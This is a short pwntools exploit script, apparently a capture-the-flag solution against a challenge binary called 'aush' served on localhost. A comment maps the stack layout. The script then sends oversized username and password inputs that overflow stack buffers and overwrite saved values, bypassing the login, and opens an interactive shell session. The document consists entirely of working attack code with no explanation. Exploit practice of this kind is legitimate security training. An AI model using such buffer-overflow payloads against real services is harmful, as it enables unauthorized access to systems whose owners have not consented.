from pwn import *

# p = process("./aush")
p = remote("localhost", 9006)

'''
RBP-0xa0    args
RBP-0x80    username
RBP-0x70    inpuser
RBP-0x50    password
RBP-0x30    inppass
RBP
RBP+0x128   evnp[0]
'''

payload  = b'a'*0x198
payload += p64(0xdeadbeef)
p.recvuntil(b'Username: ')
p.send(payload)

payload  = b'a'*0x158
payload += p64(0)
p.recvuntil(b'Password: ')
p.send(payload)

p.interactive()
